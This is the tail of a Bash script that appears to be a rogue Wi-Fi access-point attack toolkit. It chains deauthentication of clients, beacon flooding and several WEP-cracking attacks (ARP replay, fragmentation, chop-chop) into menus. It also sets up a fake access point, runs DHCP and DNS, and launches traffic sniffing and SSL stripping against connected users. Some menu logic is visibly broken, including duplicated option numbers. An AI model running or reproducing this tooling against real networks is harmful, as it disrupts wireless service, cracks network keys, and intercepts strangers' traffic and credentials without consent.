iwlist $ATHIFACE scan | awk '/Address/ {print $5}' > $sessionfolder/logs/scannedwifimaclist.txt
echo "a/$MAC|any" > $sessionfolder/logs/droprules.txt
echo "d/any|any" >> $sessionfolder/logs/droprules.txt
echo "$MAC" > $sessionfolder/logs/whitelist.txt
isempty=$(ls -l $sessionfolder/logs | awk '/scannedwifimaclist.txt/ {print $5}')
echo ""
echo "+===================================+"
echo "| DEAUTH PEOPLE                      "
echo "+===================================+"
echo "| 1) MDK3 | Murder Death Kill III    "
echo "| 2) AIREPLAY-NG | Aircrack-NG Suite "
echo "| 3) AIRODROP-NG | Aircrack-NG Suite "
echo "+===================================+"
echo ""
read -e -p "Option: " DEAUTHPROG
if [ "$DEAUTHPROG" = "1" ]; then
DEAUTHPROG=mdk3
gnome-terminal --geometry="$termwidth"x15 --hide-menubar -e "mdk3 $MONIFACE d -c $CHAN -w $sessionfolder/logs/whitelist.txt"
fi
if [ "$DEAUTHPROG" = "3" ]; then
DEAUTHPROG=airdrop-ng
gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="AIRODUMP-NG" -e \
"airodump-ng --output-format csv --write $sessionfolder/pcap/dump.csv $MONIFACE"
sleep 5
if [ -f != /usr/sbin/airdrop-ng ]; then
ln -s /pentest/wireless/airdrop-ng/airdrop-ng /usr/sbin/airdrop-ng
fi
gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="AIRDROP-NG" -e \
"airdrop-ng -i $MONIFACE -t $sessionfolder/pcap/dump.csv-01.csv -r $sessionfolder/logs/droprules.txt"
fi
if [ "$DEAUTHPROG" = "2" ]; then
DEAUTHPROG=aireplay-ng
echo ""
echo "+===================================+"
echo "| 1) ESSID | ACCESSPOINT NAME        "
echo "| 2) APMAC | MAC ADDRESS OF AP       "
echo "| 3) CLIEN | ATTACK CLIENT           "
echo "+===================================+"
echo ""
read -e -p "Option: " DEAUTHMODE
if [ "$DEAUTHMODE" = "1" ]; then
gnome-terminal -e "aireplay-ng -0 $COUNT -e \"$ESSID\" $MONIFACE"; fi
if [ "$DEAUTHMODE" = "2" ]; then
echo ""
echo "EXAMPLE: aa:bb:cc:dd:ee:ff"
read -e -p "What Is The APs MAC ADDRESS? " APMAC
gnome-terminal -e "aireplay-ng -0 $COUNT -a $APMAC $MONIFACE"; fi
if [ "$DEAUTHMODE" = "3" ]; then
echo ""
echo "EXAMPLE: aa:bb:cc:dd:ee:ff"
read -e -p "What Is The APs MAC ADDRESS? " APMAC
read -e -p "What Is The CLIENTs MAC ADDRESS? " CLIENTMAC
gnome-terminal -e "aireplay-ng -0 $COUNT -a $APMAC -c $CLIENTMAC $MONIFACE"; fi
fi
sleep $COUNT
killall -q -9 $DEAUTHPROG
echo ""
attackmenu
}
function beaconflood(){
read -e -p "how many fake aps would you like? (max 30) " end
if [ "$end" -gt "30" ]; then beaconflood; fi
read -e -p "use wordlist file? (type yes) " yesno
if [ "$yesno" = "yes" ]; then
read -e -p "wordlist File? " file
else
read -e -p "what essid? " essid
fi
startmonitormode
start=0
while [ $start -lt $end ]; do
if [ "$yesno" = "yes" ]; then
essid=`lc="$(($RANDOM % $(wc -l $file|awk '{print $1}')))"; sed -n "${lc}p" $file`
sleep 2
fi
mdk3 $iface b -c $chan -n "$essid$RANDOM" &
let start=start+1
done
sleep 999
killall mdk3
attackmenu
}
########################
# CHECK BATTERY LEVELS #
########################
function battery(){
BATTERY=/proc/acpi/battery/BAT0

REM_CAP=`grep "^remaining capacity" $BATTERY/state | awk '{ print $3 }'`
FULL_CAP=`grep "^last full capacity" $BATTERY/info | awk '{ print $4 }'`
BATSTATE=`grep "^charging state" $BATTERY/state | awk '{ print $3 }'`

CHARGE=`echo $(( $REM_CAP * 100 / $FULL_CAP ))`

NON='\033[00m'
BLD='\033[01m'
RED='\033[01;31m'
GRN='\033[01;32m'
YEL='\033[01;33m'

COLOUR="$RED"

case "${BATSTATE}" in
   'charged')
   BATSTT="$BLD=$NON"
   ;;
   'charging')
   BATSTT="$BLD+$NON"
   ;;
   'discharging')
   BATSTT="$BLD-$NON"
   ;;
esac

if [ "$CHARGE" -gt "99" ]
then
   CHARGE=100
fi

if [ "$CHARGE" -gt "15" ]
then
   COLOUR="$YEL"
fi

if [ "$CHARGE" -gt "30" ]
then
   COLOUR="$GRN"
fi

echo $CHARGE
}
# +===================================+
# | ANYTHING UNDER THIS IS UNTESTED   |
# | AND CAN BE USED FOR WEP CRACKING  |
# +===================================+
function capture(){
echo "+===================================+"
echo "| Capturing IVs For $ESSID          |"
echo "+===================================+"
gnome-terminal --geometry=130x15 --hide-menubar --title=CAPTURE-"$ESSID" -e \
"airodump-ng -c $CHAN --bssid $BSSID -w $folder/haxor.cap $MONIFACE"
sleep 5
}
function associate(){
echo "+===================================+"
echo "| Trying To Join ESSID: $ESSID"
echo "+===================================+"
gnome-terminal --geometry=130x15 --hide-menubar --title=JOIN-"$ESSID" -e \
"aireplay-ng -1 0 -e \"$ESSID\" -a \"$BSSID\" -h \"$TARGETMAC\" \"$MONIFACE\" &>/dev/null &"
}
function injectarpclientless(){
echo "+===================================+";
echo "Injecting ARP packets into "$ESSID"";
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -3 -b "$BSSID" -h "$MAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function injectarpclient(){
echo "+===================================+";
echo "Injecting Client ARP packets into "$ESSID"";
#xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
#aireplay-ng -2 -b "$BSSID" -d FF:FF:FF:FF:FF:FF -m 68 -n 86 -t 1 -f 1 "$MIFACE" &>/dev/null &
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -3 -b "$BSSID" -h "$CLIENTMAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function randomarpclientless(){
echo "+===================================+";
echo "Injecting a random ARP packet into "$ESSID"";
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b "$BSSID" -h "$MAC" -r replay*.cap "$MIFACE" &>/dev/null &
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -m 68 -n 86 -b "$BSSID" -c FF:FF:FF:FF:FF:FF -h "$MAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function randomarpclient(){
echo "+===================================+";
echo "Injecting a random ARP packet into "$ESSID"";
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b "$BSSID" -h "$CLIENTMAC" -r replay*.cap "$MIFACE" &>/dev/null &
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -m 68 -n 86 -b "$BSSID" -c FF:FF:FF:FF:FF:FF -h "$CLIENTMAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function fragclientless(){
echo "+===================================+"
echo "Starting fragmenation attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Fragmenation Attack" -geometry 90x20 -e \
aireplay-ng -5 -b "$BSSID" -h "$MAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function fragclient(){
echo "+===================================+";
echo "Starting fragmenation attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Fragmenation Attack" -geometry 90x20 -e \
aireplay-ng -5 -b "$BSSID" -h "$CLIENTMAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function chopchopclientless(){
echo "+===================================+";
echo "Starting chop chop attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Chop Chop Attack" -geometry 90x20 -e \
aireplay-ng -4 -b "$BSSID" -h "$MAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function chopchopclient(){
echo "+===================================+";
echo "Starting chop chop attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Chop Chop Attack" -geometry 90x20 -e \
aireplay-ng -4 -b "$BSSID" -h "$CLIENTMAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function injectcapturedarpcleintless(){
echo "+===================================+";
echo "Injecting the created ARP packet";
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -2 -b "$BSSID" -h "$MAC" -r h4x0r-arp "$MONIFACE" &>/dev/null &
sleep 5;
}
function injectcapturedarpcleint(){
echo "+===================================+";
echo "Injecting the created ARP packet";
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -2 -b "$BSSID" -h "$CLIENTMAC" -r h4x0r-arp "$MONIFACE" &>/dev/null &
sleep 5;
}
function xorfragclientless(){
packetforge-ng -0 -a "$BSSID" -h "$MAC" -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w h4x0r-arp
sleep 5;
}
function xorfragclient(){
packetforge-ng -0 -a "$BSSID" -h "$CLIENTMAC" -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w h4x0r-arp
sleep 5;
}
function xorchopchopclientless(){
packetforge-ng -0 -a "$BSSID" -h "$MAC" -k 255.255.255.255 -l 255.255.255.255 -y replay*.xor -w h4x0r-arp
sleep 5;
}
function xorchopchopclient(){
packetforge-ng -0 -a "$BSSID" -h "$CLIENTMAC" -k 255.255.255.255 -l 255.255.255.255 -y replay*.xor -w h4x0r-arp
sleep 5;
}
function crackkey(){
echo "+===================================+";
read -p "Hit Enter when you have 10,000 IV's, could take up to 5 min.";
echo "+===================================+";
echo "Starting to H4X0R the WEP key..................";
xterm -hold -bg black -fg blue -T "Cracking" -e aircrack-ng -b "$BSSID" h4x0r*.cap &>/dev/null &
sleep 1;
echo "+===================================+";
echo "You should see the WEP key soon......";
echo "+===================================+";
exit 0
}
function wepattackmenu(){
clear;
echo "******************************************************************";
echo "**************Please select the type of attack below**************";
echo "THIS WILL DELETE ANY PREVIOUS h4x0r.cap* FILE RENAME IT TO KEEP IT";
echo "******************************************************************";
showMenu () {
 echo
 echo "1) ARP request replay attack (clientless)"
 echo "2) NOT TESTED Fragmentation (clientless)"
 echo "3) NOT TESTED Chop Chop (clientless)"
 echo "3) NOT TESTED ARP request replay attack (client)"
 echo "4) NOT TESTED Fragmentation (Client)"
 echo "5) NOT TESTED Chop Chop (client)"
}
while [ 1 ]
do
 showMenu
 read CHOICE
 case "$CHOICE" in
 "1")
  echo "ARP request replay attack (clientless)";
  capture;
  associate;
  injectarpclientless;
  crackkey;
  ;;
 "2")
  echo "Fragmentation (clientless)";
  capture;
  associate;
  fragclientless;
  xorfragclientless;
  injectcapturedarpcleintless;
  crackkey;
  ;;
 "3")
  echo "Chop Chop (clientless)"
  capture;
  associate;
  chopchopclientless;
  xorchopchopclientless;
  injectcapturedarpcleintless;
  crackkey;
  ;;
 "4")
  echo "ARP request replay attack (client)";
  capture;
  associate;
  injectarpclientless;
  injectarpclient;
  crackkey; 
  ;;
 "5")
  echo "Fragmentation (Client)";
  capture;
  fragclient;
  xorfragclient;
  injectcapturedarpcleint;
  crackkey;
  ;;
 "6")
  echo "Chop Chop (client)";
  capture;
  chopchopclient;
  xorchopchopclient;
  injectcapturedarpcleintless;
  crackkey;
  ;;
 esac
done
}
# +===================================+
# | ANYTHING ABOVE THIS IS UNTESTED   |
# +===================================+
mydistro="`awk '{print $1}' /etc/issue`"
myversion="`awk '{print $2}' /etc/issue`"
myrelease="`awk '{print $3}' /etc/issue`"
# Dep Check
banner
sleep 5
pinginternet
echo "+===================================+"
echo "| Dependency Check                  |"
echo "+===================================+"
# Are we root?
if [ $UID -eq 0 ]; then echo "We are root: `date`" >> $LOG
else
echo "[$FAIL] Please Run This Script As Root or With Sudo!";
echo "";
exit 0; fi
if [ "$mydistro" = "BackTrack" ]; then echo "| [$OK] $mydistro Version $myversion Release $myrelease"; fi
if [ "$mydistro" = "Ubuntu" ]; then echo "| [$OK] $mydistro Version $myversion"; fi
echo "| [$OK] SCRIPT REVISION: $REVISION"
if [ "$INTERNET" = "FALSE" ]; then echo "| [$FAIL] No Internet Connection : - ("; fi
if [ "$INTERNET" = "TRUE" ]; then echo "| [$OK] We Have Internet :-)"; dnscheck; fi
if [ "$DNS" = "FALSE" ]; then echo "| [$FAIL] DNS Error Cant Update Check"; fi
type -P aircrack-ng &>/dev/null || { echo "| [FATAL] aircrack-ng"; echo "aircrack-ng" >> $sessionfolder/logs/missing.log;}
type -P dnsmasq &>/dev/null || { echo "| [$FAIL] dnsmasq"; echo "dnsmasq" >> $sessionfolder/logs/missing.log;}
if [ "$mydistro" = "BackTrack" ]; then
type -P dhcpd3 &>/dev/null || { echo "| [$FAIL] dhcpd3"; echo "dhcpd3" >> $sessionfolder/logs/missing.log;}
fi
if [ "$mydistro" != "BackTrack" ]; then
type -P dhcpd &>/dev/null || { echo "| [$FAIL] dhcpd"; echo "dhcpd" >> $sessionfolder/logs/missing.log;}
fi
type -P airdrop-ng &>/dev/null || { echo "| [$FAIL] airdrop-ng"; echo "airdrop-ng" >> $sessionfolder/logs/missing.log;}
type -P xterm &>/dev/null || { echo "| [$FAIL] xterm"; echo "xterm" >> $sessionfolder/logs/missing.log;}
type -P iptables &>/dev/null || { echo "| [$FAIL] iptables"; echo "iptables" >> $sessionfolder/logs/missing.log;}
type -P ettercap &>/dev/null || { echo "| [$FAIL] ettercap"; echo "ettercap" >> $sessionfolder/logs/missing.log;}
type -P arpspoof &>/dev/null || { echo "| [$FAIL] arpspoof"; echo "arpspoof" >> $sessionfolder/logs/missing.log;}
type -P sslstrip &>/dev/null || { echo "| [$FAIL] sslstrip"; echo "sslstrip" >> $sessionfolder/logs/missing.log;}
type -P driftnet &>/dev/null || { echo "| [$FAIL] driftnet"; echo "driftnet" >> $sessionfolder/logs/missing.log;}
type -P urlsnarf &>/dev/null || { echo "| [$FAIL] urlsnarf"; echo "urlsnarf" >> $sessionfolder/logs/missing.log;}
type -P dsniff &>/dev/null || { echo "| [$FAIL] dsniff"; echo "dsniff" >> $sessionfolder/logs/missing.log;}
type -P python &>/dev/null || { echo "| [$FAIL] python"; echo "python" >> $sessionfolder/logs/missing.log;}
type -P macchanger &>/dev/null || { echo "| [$FAIL] macchanger"; echo "macchanger" >> $sessionfolder/logs/missing.log;}
type -P msfconsole &>/dev/null || { echo "| [$FAIL] metasploit"; echo "metasploit" >> $sessionfolder/logs/missing.log;}
# apt-get install python-dev
echo "+===================================+"
echo ""
if [ "$INTERNET" = "TRUE" ] && [ "$DNS" = "TRUE" ]; then checkupdate; fi
if [ "$INTERNET" = "TRUE" ] && [ "$DNS" = "TRUE" ]; then internetmenu; fi
if [ "$internetmenu" = "1" ]; then installdeps; fi
if [ "$internetmenu" = "2" ]; then installdeps; fi
if [ "$internetmenu" = "3" ]; then forceupdate; fi
if [ "$internetmenu" = "4" ]; then runscript; fi
stopshit
modprobe tun
echo ""
poisonmenu
softapmenu
if [ -f != $settings ]; then settings; fi
if [ "$softap" = "0" ]; then TAPIFACE=at0; fi
if [ "$softap" = "1" ] && [ "$ATHIFACE" != "" ]; then TAPIFACE=$ATHIFACE; fi
if [ "$mode" != "2" ]; then dhcpmenu; fi
monitormodestop
if [ "$mode" = "4" ]; then wepattackmenu; fi
echo "* STARTING ACCESS POINT: $ESSID *"
echo "* WIRELESS IFACE: $TAPIFACE *"
echo "* IP: $TAPIP *"
echo "* BSSID: $MAC *"
echo "* CHANNEL: $CHAN *"
echo "* PACKETS PER SECOND: $PPS *"
echo "* BEACON INTERVAL: $BEAINT *"
if [ "$softap" = "0" ]; then monitormodestart; startairbase; fi
if [ "$softap" = "1" ]; then hostapdconfig; starthostapd; fi
sleep 2
if [ "$mode" != "2" ]; then
ifconfig $TAPIFACE up
ifconfig $TAPIFACE $TAPIP netmask $NETMASK;
ifconfig $TAPIFACE mtu $MTU;
route add -net $TAPIPBLOCK netmask $NETMASK gw $TAPIP; fi
wireshark -i $TAPIFACE -k &
if [ "$mode" = "2" ]; then DHCPSERVER=4; fi
if [ "$DHCPSERVER" = "1" ]; then dnsmasqconfig; fi
if [ "$DHCPSERVER" = "2" ]; then dhcpd3config; fi
if [ "$DHCPSERVER" = "3" ]; then udhcpdconfig; fi
if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
if [ "$mode" = "1" ]; then
apachesetup
apachecheck
firewall
firewalltesting
echo "# Generated by accesspoint.sh" > /etc/resolv.conf
echo "nameserver 127.0.0.1" >> /etc/resolv.conf
fi
if [ "$mode" = "2" ]; then
firewall
brlan
firewallbrlan
echo "# Generated by accesspoint.sh" > /etc/resolv.conf
echo "nameserver $GATEWAY" >> /etc/resolv.conf
fi
if [ "$softap" = "0" ]; then taillogsairbase; fi
if [ "$softap" = "1" ]; then taillogshostapd; fi
attackmenu
if [ "$attack" = "1" ]; then deauth; fi
if [ "$attack" = "2" ]; then wireshark -i $TAPIFACE -p -k -w $folder/$TAPIFACE.pcap; fi
if [ "$attack" = "3" ]; then dsniff -m -i $TAPIFACE -d -w $folder/dsniff.log; fi
if [ "$attack" = "4" ]; then urlsnarf -i $TAPIFACE; fi
if [ "$attack" = "5" ]; then driftnet -i $TAPIFACE; fi
if [ "$attack" = "6" ]; then sslstrip -a -k -f; fi
if [ "$attack" = "7" ]; then beaconflood; fi
if [ "$attack" = "8" ]; then exit 0; fi
if [ "$attack" = "9" ]; then
echo ""
echo "ATEMPTING TO END ATTACK..."
stopshit
monitormodestop
cleanup
fi

